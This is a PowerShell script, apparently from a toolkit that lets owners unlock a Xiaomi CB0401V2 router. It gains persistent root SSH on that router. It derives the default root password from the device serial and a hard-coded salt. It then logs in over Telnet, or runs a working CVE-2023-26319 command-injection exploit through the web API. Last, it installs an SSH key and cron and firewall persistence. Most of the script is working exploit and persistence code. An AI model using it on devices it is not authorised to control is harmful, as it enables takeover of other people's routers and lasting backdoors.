#
# open_ssh.ps1 — opens persistent root SSH on a CB0401V2, without xmir-patcher
# or any Python dependency. Windows equivalent of open_ssh.sh — see that file
# for the full explanation of why this works.
#
# Two paths, tried in order:
#
#   Path A — Telnet (firmware < 3.0.100):
#     Serial number → derived default password → Telnet login → patch + key.
#
#   Path B — CVE-2023-26319 web exploit (firmware 3.0.100+, Telnet closed):
#     Web UI login → SmartController `mac` injection → write bootstrap script
#     to /tmp/e in 2-char chunks → execute → install persistence via SSH.
#     Set $env:WEB_PASSWORD if your web-UI password differs from the factory
#     default (both are the same derived default on a factory-fresh router).
#
# Usage: powershell -ExecutionPolicy Bypass -File open_ssh.ps1 [-RouterIp <ip>] [-PubKeyFile <path>]
#
param(
    [string]$RouterIp   = $(if ($env:ROUTER_IP) { $env:ROUTER_IP } else { '192.168.31.1' }),
    [string]$PubKeyFile = '',
    [int]$TelnetTimeoutSec = 8
)
$ErrorActionPreference = 'Stop'

function Say($msg) { Write-Host "==> $msg" }
function Die($msg) { Write-Host "ERROR: $msg" -ForegroundColor Red; exit 1 }

# setup.ps1 checks $LASTEXITCODE after running this script to decide
# whether to fall back to a password-based key install - which only works
# if we guarantee a real process exit code even on a totally unexpected
# error, since a PowerShell script that dies to an uncaught exception
# (rather than an explicit `exit`) does not reliably set $LASTEXITCODE.
try {

# --- 1. Fetch the serial number (no auth needed) ----------------------------

Say "Fetching device info from $RouterIp..."
try {
    $infoJson = Invoke-RestMethod -Uri "http://$RouterIp/cgi-bin/luci/api/xqsystem/init_info" -TimeoutSec 8
} catch {
    Die "No response from the router's web UI. Is it powered on and reachable at $RouterIp ($($_.Exception.Message))?"
}
$serial   = $infoJson.id
$hardware = $infoJson.hardware
if (-not $serial) {
    Die "Could not find a serial number in the router's response - this may not be a supported Xiaomi/MiWiFi device, or it isn't in factory state yet (finish the initial setup at http://$RouterIp first)."
}
Say "Device: $(if ($hardware) { $hardware } else { 'unknown' }) (serial: $serial)"

# --- 2. Derive the default root password ------------------------------------

$salt     = '6d2df50a-250f-4a30-a5e6-d44fb0960aa0'
$md5      = [System.Security.Cryptography.MD5]::Create()
$hashBytes = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$serial$salt"))
$md5Hex   = -join ($hashBytes | ForEach-Object { $_.ToString('x2') })
$defaultPassword = $md5Hex.Substring(0, 8)
Say 'Derived default root password (from the serial number, not a secret we invented).'

# Web UI uses the same factory default as Telnet.
$webPassword = if ($env:WEB_PASSWORD) { $env:WEB_PASSWORD } else { $defaultPassword }

# --- 3. Locate and read the SSH public key ----------------------------------

if (-not $PubKeyFile) {
    $PubKeyFile = Join-Path $PSScriptRoot '..\gui\router_key.pub'
}
if (-not (Test-Path $PubKeyFile)) {
    Die "SSH public key not found at $PubKeyFile. Generate one first: ssh-keygen -t ed25519 -f router_key -N '""' -C cb0401-tune-control-gui"
}
$pubKey = (Get-Content $PubKeyFile -Raw).Trim()

# --- Path B: CVE-2023-26319 web exploit -------------------------------------
# Called when Telnet is closed. Implements the same injection mechanism as
# xmir-patcher's connect5.py: the xqsmarthome SmartController `mac` field is
# passed unsanitised into a 100-byte sprintf() → system() call.

function Invoke-WebExploit {
    Say "Telnet port 23 is closed; trying web exploit (CVE-2023-26319)..."

    # SHA1 via .NET
    $sha1 = [System.Security.Cryptography.SHA1]::Create()
    function Get-SHA1Hex($text) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
        $hash  = $sha1.ComputeHash($bytes)
        return (-join ($hash | ForEach-Object { $_.ToString('x2') }))
    }

    # --- Web login → stok ---
    Say "Logging in to the web UI at http://$RouterIp ..."
    try {
        $page = (Invoke-WebRequest -Uri "http://$RouterIp/cgi-bin/luci/web" -TimeoutSec 10 -UseBasicParsing).Content
    } catch {
        Die "Could not reach the router web UI: $($_.Exception.Message)"
    }
    if ($page -match "key: '([^']+)'")        { $loginKey = $Matches[1] } else { Die "Couldn't parse login key from web UI." }
    if ($page -match "deviceId = '([^']+)'")  { $deviceId = $Matches[1] } else { $deviceId = '' }

    $ts       = [int](Get-Date -UFormat '%s')
    $rnd      = Get-Random -Maximum 10000
    $nonce    = "0_${deviceId}_${ts}_${rnd}"
    $account  = Get-SHA1Hex "$webPassword$loginKey"
    $logdata  = Get-SHA1Hex "$nonce$account"

    $loginResp = Invoke-RestMethod -Uri "http://$RouterIp/cgi-bin/luci/api/xqsystem/login" `
        -Method Post -TimeoutSec 10 `
        -Body "username=admin&logData=$logdata&nonce=$nonce" `
        -ContentType 'application/x-www-form-urlencoded'
    $stok = $loginResp.token
    if (-not $stok) { Die "Web login failed (wrong WEB_PASSWORD?). Response: $loginResp" }
    Say "Logged in."

    $smartUrl = "http://$RouterIp/cgi-bin/luci/;stok=$stok/api/xqsmarthome/request_smartcontroller"

    # Execute a short command via SmartController mac injection.
    # Three HTTP requests per call (scene_setting → scene_start_by_crontab → scene_delete).
    function Invoke-TinyExec($cmd) {
        $escaped = $cmd -replace '\\', '\\\\' -replace '"', '\"'
        $body = @"
{"command":"scene_setting","action_list":[{"thirdParty":"xmrouter","payload":{"command":"wan_block","mac":";$escaped;"}}],"launch":{"timer":{"time":"23:59","repeat":"0","enabled":true}}}
"@
        $resp = Invoke-RestMethod -Uri $smartUrl -Method Post -Body $body `
            -ContentType 'application/json' -TimeoutSec 8
        $sceneId = $resp.id
        if (-not $sceneId) { Write-Warning "Injection call failed for: $cmd"; return }

        Invoke-RestMethod -Uri $smartUrl -Method Post -TimeoutSec 8 `
            -ContentType 'application/json' `
            -Body "{`"command`":`"scene_start_by_crontab`",`"id`":$sceneId}" | Out-Null
        Start-Sleep -Milliseconds 500
        Invoke-RestMethod -Uri $smartUrl -Method Post -TimeoutSec 8 `
            -ContentType 'application/json' `
            -Body "{`"command`":`"scene_delete`",`"id`":$sceneId}" | Out-Null
    }

    # Write a script to /tmp/e in 2-char chunks then execute it.
    function Invoke-ExecOnRouter($script) {
        $n = $script.Length
        Invoke-TinyExec "rm -f /tmp/e"
        Say "Writing $n-char script via injection ($([Math]::Ceiling($n/2)) calls × 3 HTTP requests each)..."
        $i = 0
        while ($i -lt $n) {
            $chunk = $script.Substring($i, [Math]::Min(2, $n - $i))
            Invoke-TinyExec "echo -n `"$chunk`">>/tmp/e"
            $i += 2
        }
        Say "Executing /tmp/e on the router..."
        Invoke-TinyExec "sh /tmp/e"
        Invoke-TinyExec "rm -f /tmp/e"
    }

    # Bootstrap script: no double-quote chars (breaks echo injection syntax).
    $script = "mkdir -p /etc/dropbear;nvram set ssh_en=1;nvram commit;sed -i s/release/XXXXXX/g /etc/init.d/dropbear;/etc/init.d/dropbear enable;/etc/init.d/dropbear restart;echo $pubKey>>/etc/dropbear/authorized_keys;chmod 600 /etc/dropbear/authorized_keys"
    Invoke-ExecOnRouter $script

    Say "Waiting for dropbear to start..."
    Start-Sleep -Seconds 4

    # Install persistence via SSH (key was just placed by the bootstrap script).
    $privKey = $PubKeyFile -replace '\.pub$', ''
    $sshOpts = @('-o', 'HostKeyAlgorithms=+ssh-rsa', '-o', 'PubkeyAcceptedAlgorithms=+ssh-rsa',
                 '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=8')
    $testResult = & ssh @sshOpts -i $privKey "root@$RouterIp" 'true' 2>&1
    if ($LASTEXITCODE -ne 0) {
        Die "SSH did not open after the exploit. CVE-2023-26319 may be patched on this firmware (try xmir-patcher instead)."
    }

    Say "SSH is up. Installing persistence (cron + firewall hook) via SSH..."
    $persistenceScript = @'
mkdir -p /etc/crontabs/patches
cat > /etc/crontabs/patches/ssh_patch.sh <<'SSH_PATCH_EOF'
#!/bin/sh
nvram set ssh_en=1
nvram commit
sed -i s/release/XXXXXX/g /etc/init.d/dropbear
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
SSH_PATCH_EOF
chmod +x /etc/crontabs/patches/ssh_patch.sh
grep -v "/ssh_patch.sh" /etc/crontabs/root > /etc/crontabs/root.new 2>/dev/null || echo "" > /etc/crontabs/root.new
echo "*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1" >> /etc/crontabs/root.new
mv /etc/crontabs/root.new /etc/crontabs/root
uci set firewall.auto_ssh_patch=include
uci set firewall.auto_ssh_patch.type='script'
uci set firewall.auto_ssh_patch.path='/etc/crontabs/patches/ssh_patch.sh'
uci set firewall.auto_ssh_patch.enabled='1'
uci commit firewall
'@
    $persistenceScript | & ssh @sshOpts -i $privKey "root@$RouterIp" 'sh'
}

# --- Path A: Telnet (try first) ---------------------------------------------

Say "Connecting to Telnet on ${RouterIp}:23 ..."
$client = New-Object System.Net.Sockets.TcpClient
$telnetOpen = $false
try {
    $connectTask = $client.ConnectAsync($RouterIp, 23)
    if ($connectTask.Wait(5000)) { $telnetOpen = $true }
} catch { }

if (-not $telnetOpen) {
    Invoke-WebExploit
    Say "Done. SSH is open and this toolkit's key is installed."
    Say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i $($PubKeyFile -replace '\.pub$','') root@$RouterIp"
    exit 0
}

$stream = $client.GetStream()

function Wait-ForText($needle) {
    $buf = New-Object System.Text.StringBuilder
    $deadline = (Get-Date).AddSeconds($TelnetTimeoutSec)
    $byteBuf = New-Object byte[] 1
    while ((Get-Date) -lt $deadline) {
        if ($stream.DataAvailable) {
            $n = $stream.Read($byteBuf, 0, 1)
            if ($n -gt 0) {
                [void]$buf.Append([char]$byteBuf[0])
                if ($buf.ToString().Contains($needle)) { return $true }
            }
        } else {
            Start-Sleep -Milliseconds 50
        }
    }
    return $false
}

function Send-Line($text) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes("$text`r`n")
    $stream.Write($bytes, 0, $bytes.Length)
}

$prompt = '# '

if (Wait-ForText 'login:') {
    Send-Line 'root'
    if (-not (Wait-ForText 'assword:')) { Die "Telnet didn't ask for a password after the username - unexpected prompt sequence." }
    Send-Line $defaultPassword
    if (-not (Wait-ForText $prompt)) { Die "Login with the derived default password was rejected. Either this router's password differs from the documented derivation, or it's already locked down." }
} elseif (Wait-ForText $prompt) {
    # some devices drop you straight into a root shell, no login prompt
} else {
    Die "Telnet didn't present a recognizable login or shell prompt within ${TelnetTimeoutSec}s."
}

Say 'Logged in over Telnet. Patching the router...'

Send-Line 'mkdir -p /etc/crontabs/patches'
Wait-ForText $prompt | Out-Null

$sshPatchScript = @"
cat > /etc/crontabs/patches/ssh_patch.sh << 'CB0401_SSH_PATCH_EOF'
#!/bin/sh
LOG_FN=/tmp/ssh_patch.log
[ -e `$LOG_FN ] && return 0
: > `$LOG_FN
SSH_EN=``nvram get ssh_en``
if [ "`$SSH_EN" != "1" ]; then
    nvram set ssh_en=1
    nvram commit
fi
if grep -q '= "release"' /etc/init.d/dropbear ; then
    sed -i 's/= "release"/= "XXXXXX"/g'  /etc/init.d/dropbear
fi
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
echo "ssh enabled" > `$LOG_FN
CB0401_SSH_PATCH_EOF
"@
Send-Line $sshPatchScript
Wait-ForText $prompt | Out-Null

Send-Line 'chmod +x /etc/crontabs/patches/ssh_patch.sh'
Wait-ForText $prompt | Out-Null

Send-Line 'grep -v "/ssh_patch.sh" /etc/crontabs/root > /etc/crontabs/root.new 2>/dev/null || echo "" > /etc/crontabs/root.new; echo "*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1" >> /etc/crontabs/root.new; mv /etc/crontabs/root.new /etc/crontabs/root'
Wait-ForText $prompt | Out-Null

Send-Line "uci set firewall.auto_ssh_patch=include; uci set firewall.auto_ssh_patch.type='script'; uci set firewall.auto_ssh_patch.path='/etc/crontabs/patches/ssh_patch.sh'; uci set firewall.auto_ssh_patch.enabled='1'; uci commit firewall"
Wait-ForText $prompt | Out-Null

Send-Line 'rm -f /tmp/ssh_patch.log; sh /etc/crontabs/patches/ssh_patch.sh'
Wait-ForText $prompt | Out-Null

Say "Installing this toolkit's SSH key..."
Send-Line "mkdir -p /etc/dropbear; grep -qF '$pubKey' /etc/dropbear/authorized_keys 2>/dev/null || echo '$pubKey' >> /etc/dropbear/authorized_keys; chmod 600 /etc/dropbear/authorized_keys"
Wait-ForText $prompt | Out-Null

Send-Line 'exit'
$stream.Close()
$client.Close()

Say 'Done. SSH should now be enabled and this toolkit''s key installed.'
Say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i <key> root@$RouterIp"
exit 0

} catch {
    Die "Unexpected error: $($_.Exception.Message)"
}
